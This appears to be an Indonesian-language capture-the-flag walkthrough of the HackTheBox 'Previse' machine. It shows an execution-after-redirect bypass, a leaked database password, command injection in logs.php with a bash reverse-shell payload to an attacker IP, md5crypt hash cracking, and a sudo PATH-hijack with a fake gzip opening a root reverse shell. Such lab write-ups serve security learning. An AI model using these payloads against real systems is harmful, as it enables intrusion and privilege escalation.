
| PORT | STATE | SERVICE | VERSION                                 |
|------|-------|---------|-----------------------------------------|
| 22/tcp | open  | ssh     | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3          |
| 80/tcp | open  | http    | Apache httpd 2.4.29 (Ubuntu)             |


# Exploit

oke di sini saya menemukan kerentanan EAR, yang di mana kita bisa akses web nya tanpa harus login dengan syrat butuh brupsuite

```json
GET /files.php HTTP/1.1
Host: 10.10.11.104
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=686g8pmv4rfltkdahgq5kdcstf
Connection: close
```

```json
HTTP/1.1 200 OK
Date: Sat, 22 Jun 2024 07:57:56 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 4919
Connection: close
Content-Type: text/html; charset=UTF-8


<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
        <meta charset="utf-8" />
    
            
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="description" content="Previse rocks your socks." />
        <meta name="author" content="m4lwhere" />
        <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
        <link rel="icon" href="/favicon.ico" type="image/x-icon" />
        <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
        <link rel="manifest" href="/site.webmanifest">
        <link rel="stylesheet" href="css/uikit.min.css" />
        <script src="js/uikit.min.js"></script>
        <script src="js/uikit-icons.min.js"></script>
   

<title>Previse Files</title>
</head>
<body>

<nav class="uk-navbar-container" uk-navbar>
    <div class="uk-navbar-center">
        <ul class="uk-navbar-nav">
            <li class="uk-active"><a href="/index.php">Home</a></li>
            <li>
                <a href="accounts.php">ACCOUNTS</a>
                <div class="uk-navbar-dropdown">
                    <ul class="uk-nav uk-navbar-dropdown-nav">
                        <li><a href="accounts.php">CREATE ACCOUNT</a></li>
                    </ul>
                </div>
            </li>
            <li><a href="files.php">FILES</a></li>
            <li>
                <a href="status.php">MANAGEMENT MENU</a>
                <div class="uk-navbar-dropdown">
                    <ul class="uk-nav uk-navbar-dropdown-nav">
                        <li><a href="status.php">WEBSITE STATUS</a></li>
                        <li><a href="file_logs.php">LOG DATA</a></li>
                    </ul>
                </div>
            </li>
            <li><a href="#" class=".uk-text-uppercase">aexon</span></a></li>
            <li>
                <a href="logout.php">
                    <button class="uk-button uk-button-default uk-button-small">LOG OUT</button>
                </a>
            </li>
        </ul>
    </div>
</nav>

    <section class="uk-section uk-section-default">
        <div class="uk-container">
            <h2 class="uk-heading-divider">Files</h2>
            <p></p>
            <p>Upload files below, uploaded files in table below</p>
            <form name="upload" enctype="multipart/form-data" action="" method="post">
                <div uk-form-custom="target: true">
                    <input name="userData" type="file">
                    <input class="uk-input uk-form-width-medium" type="text" placeholder="Select file" disabled>
                </div>
                <button class="uk-button uk-button-default" type="submit" value="Submit">Submit</button>
            </form>
        </div>
        <div class="uk-container">
            <br>
            <h2 class="uk-heading-divider">Uploaded Files</h2>
    
<table class="uk-table uk-table-hover uk-table-divider">
            <thead>
            <tr>
                <th class="uk-table-shrink">#</th>
                <th class="uk-table-expand">Name</th>
                <th>Size</th>
                <th>User</th>
                <th>Date</th>
                <th>Delete</th>
            </tr>
            </thead>
            <tbody>
                <tr>
                    <td>1</td>
                    <td><a href='download.php?file=32'><button class="uk-button uk-button-text">siteBackup.zip</button></a></td>
                    <td>9948</td>
                    <td>newguy</td>
                    <td>2021-06-12 11:14:34</td>
                    <td><form action="files.php" method="post">
                        <button class="uk-button uk-button-danger uk-button-small" type="button" uk-toggle="target: #offcanvas-flip1">Delete</button>
                        <div id="offcanvas-flip1" uk-offcanvas="flip: true; overlay: true">
                            <div class="uk-offcanvas-bar">
                                <button class="uk-offcanvas-close" type="button" uk-close></button>
                                <h3>Delete File</h3>
                                <p>Are you sure you want to delete this file?</p>
                                <button class="uk-button uk-button-danger uk-button-small" type="submit" name="del" value="32">Delete</button>
                            </div>
                        </div>
                    </form></td>
                </tr></tbody></table></div>        </div>
    </section>
    
<div class="uk-position-bottom-center uk-padding-small">
	<a href="https://m4lwhere.org/" target="_blank"><button class="uk-button uk-button-text uk-text-small">Created by m4lwhere</button></a>
</div>
</body>
</html>
```


**Buat Akun**

```json
POST /accounts.php HTTP/1.1
Host: 10.10.11.104
Content-Length: 43
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.104
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.104/login.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=686g8pmv4rfltkdahgq5kdcstf
Connection: close

username=aexon&password=aexon&confirm=aexon
```

ketika sudah buat account login dengan akun tersebut, nanti download backup file nya

terdapat file config.php

```php
cat config.php 
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>

```


# Reverse shell

logs.php

```php
<?php
session_start();
if (!isset($_SESSION['user'])) {
    header('Location: login.php');
    exit;
}
?>

<?php
if (!$_SERVER['REQUEST_METHOD'] == 'POST') {
    header('Location: login.php');
    exit;
}

/////////////////////////////////////////////////////////////////////////////////////
//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
/////////////////////////////////////////////////////////////////////////////////////

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;

$filepath = "/var/www/out.log";
$filename = "out.log";    

if(file_exists($filepath)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($filepath).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($filepath));
    ob_clean(); // Discard data in the output buffer
    flush(); // Flush system headers
    readfile($filepath);
    die();
} else {
    http_response_code(404);
    die();
} 
?>
```

terdapat kerentanan yang bisa kita exploit tasi dengan rce. karena memanggil function exec

```json
POST /logs.php HTTP/1.1
Host: 10.10.11.104
Content-Length: 65
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.104
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.104/file_logs.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=686g8pmv4rfltkdahgq5kdcstf
Connection: close

delim=%3bbash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261'%3b
```


```user
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | aexon    | $1$🧂llol$REx9UrgZexkMsHtrZ18ZA/ | 2024-06-22 07:56:47 |
+----+----------+------------------------------------+---------------------+
```


```bash
┌─[aexon@parrot]─[~/Desktop/ctf-main/ctf-docs/CTF/hackthebox/linux/Previse]
└──╼ $sudo john --format=md5crypt-long  --wordlist=~/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovecody112235! (?)     
1g 0:00:07:28 DONE (2024-06-22 20:14) 0.002228g/s 16521p/s 16521c/s 16521C/s ilovecodydean..ilovecody..
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

```bash
ssh m4lwhere@10.10.11.104
ilovecody112235!
```

Flag: 
```bash
m4lwhere@previse:~$ cat user.txt 
dbe28698b948fd6a3995f6bb2f4b8c3a
```

# ROOT FLAG


```bash
m4lwhere@previse:~$ sudo -l
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
m4lwhere@previse:~$ 
```


terdapat serangan path injection, skrip ini rentan terhadap serangan path injection. Masalahnya terletak pada bagian di mana `$(date --date="yesterday" +%Y%b%d)` digunakan sebagai bagian dari path untuk file backup.

```bash
m4lwhere@previse:~$ echo "bash -i >& /dev/tcp/10.10.14.5/4445 0>&1" > gzip
m4lwhere@previse:~$ chmod 777 gzip
m4lwhere@previse:~$ export PATH=$(pwd):$PATH
m4lwhere@previse:~$ echo $PATH
/home/m4lwhere:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
m4lwhere@previse:~$ sudo -l
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh

```

FLAG :
```bash
root@previse:~# cat /root/root.txt
cat /root/root.txt
406cc2f30ae67bbe7cabda33a8882a47
root@previse:~# 
```